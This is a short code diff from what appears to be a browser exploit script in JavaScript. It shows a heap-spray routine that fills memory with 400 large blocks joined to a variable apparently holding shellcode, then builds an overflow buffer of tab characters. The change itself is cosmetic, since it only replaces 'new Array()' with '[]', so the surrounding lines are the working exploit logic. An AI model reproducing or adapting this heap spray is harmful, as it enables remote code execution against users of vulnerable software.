@@ -16,7 +16,7 @@ while (mainblk.length < slck) mainblk += mainblk;
 var fillblk = mainblk.substring(0,slck);
 var blk = mainblk.substring(0,mainblk.length - slck);
 while (blk.length + slck < 0x40000) blk = blk + blk + fillblk;
-var memory = new Array();
+var memory = [];
 for (i = 0; i < 400; i++){ memory[i] = blk + sc01 }
 var buf = '';
 while (buf.length < 512) buf = buf + unescape("%09"); // TAB - 0x09 works best here.
